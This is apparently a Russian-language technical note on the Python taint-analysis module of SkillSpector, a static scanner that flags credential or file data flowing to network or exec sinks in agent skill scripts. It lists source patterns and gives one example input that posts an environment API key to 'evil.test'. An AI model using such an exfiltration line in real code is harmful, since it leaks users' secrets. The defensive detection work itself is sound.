---
type: implementation-detail
parent-repo: repo-109-nvidia-skillspector
method-id: 28
mechanism-id: skillspector-python-source-sink-taint
repo: https://github.com/NVIDIA/SkillSpector
language: Python
license: Apache-2.0
verdict: experimental
commit-sha: 8f534e2
commit-date: 2026-07-14
verified-date: 2026-07-15
tags:
  - agent-security
---

# SkillSpector — Python source-to-sink taint (TT1–TT5)

## Репозиторий

- [NVIDIA/SkillSpector](https://github.com/NVIDIA/SkillSpector)
- Проверенный срез: `8f534e2`, дата коммита 2026-07-14; код проверен 2026-07-15.

## Что это за технология

**Taint analysis** — статический анализ потока данных: помечаем «грязные» источники (env secrets, file read, network in) и смотрим, дотекают ли они до опасных стоков (network out, `exec`, file write) без санации. SkillSpector парсит **Python AST** (не запускает код) и ищет цепочки exfil в skills/scripts. Способ №28 (toxic flow).

## Где в коде

- `src/skillspector/nodes/analyzers/behavioral_taint_tracking.py`
- Helpers: `common.py` (aliases, type map)
- Runner: `static_runner.py` (`MAX_FILE_BYTES`)
- Tests: `tests/nodes/analyzers/test_behavioral_taint_tracking.py`

## Алгоритм

1. AST parse; `build_import_aliases` / `build_type_map`.
2. Найти sources: `_CREDENTIAL_SOURCES` (`os.getenv`, …), `_FILE_READ_SOURCES`, `_NETWORK_INPUT_SOURCES`, user input.
3. Найти sinks: network out, `exec`/`subprocess`, file write.
4. Propagate taint через assignments, containers, f-strings.
5. Если tainted value в аргументах sink → finding TT1–TT5 (credentials→network, file→network, input→exec, …).

## Примеры реализации

```python
_CREDENTIAL_SOURCES = frozenset({
    "os.environ.get", "os.environ", "os.getenv",
})
_FILE_READ_SOURCES = frozenset({
    "open", "pathlib.Path.read_text", "pathlib.Path.read_bytes",
})
_NETWORK_INPUT_SOURCES = frozenset({
    "requests.get", "requests.post", …, "urllib.request.urlopen", …
})
```

Специализированные правила TT3–TT5 выделяют credentials→network, file→network, external→exec.

## Пример: вход → решение

```python
secret = os.getenv("API_KEY")
requests.post("https://evil.test", data=secret)
```
→ taint credential source → network sink → finding.

```python
x = os.getenv("API_KEY")
print("ok")  # no sink
```
→ no finding.

## Детерминизм или машинное обучение

**Детерминированный** AST analysis (без LLM на этом analyzer).

## Внешние зависимости

Python stdlib `ast`; SkillSpector runtime.

## Ограничения

- Только Python; нет полного interprocedural graph.
- Dynamic `getattr` / native code рвут taint.
- Лимит `MAX_FILE_BYTES`.

## Сигналы качества

- Unit tests на direct/variable-mediated flows, aliases, containers.

## Вердикт

**экспериментально** — конкретный тестируемый taint для skill scripts.

## Связи

- Репозиторий: [[repo-109-nvidia-skillspector]]
